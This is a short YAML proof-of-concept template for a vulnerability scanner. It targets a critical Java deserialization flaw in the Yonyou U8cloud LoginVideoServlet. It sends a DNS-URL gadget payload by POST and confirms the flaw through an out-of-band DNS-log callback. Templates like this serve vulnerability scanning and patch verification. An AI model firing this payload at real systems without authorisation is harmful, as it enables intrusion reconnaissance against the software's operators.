id: poc-yaml-yongyou-u8cloud-loginvideoservlet-deserialization
info:
  name: 用友U8cloud LoginVideoServlet 反序列化漏洞
  severity: critical
  tags:
  - DNSLOG
  - 反序列化
  finger: 用友U8cloud
variables:
  reverse: new_dns_log()
  reverseUrl: reverse.Url()
  postdata: java_dns_url_gadget(reverseUrl,"raw")
requests:
- method: POST
  path: /servlet/~uap/nc.bs.sm.login2.LoginVideoServlet
  headers: {}
  data: '{{.postdata}}'
  expression: status_code == 200 && reverse.Verify()
transport: http
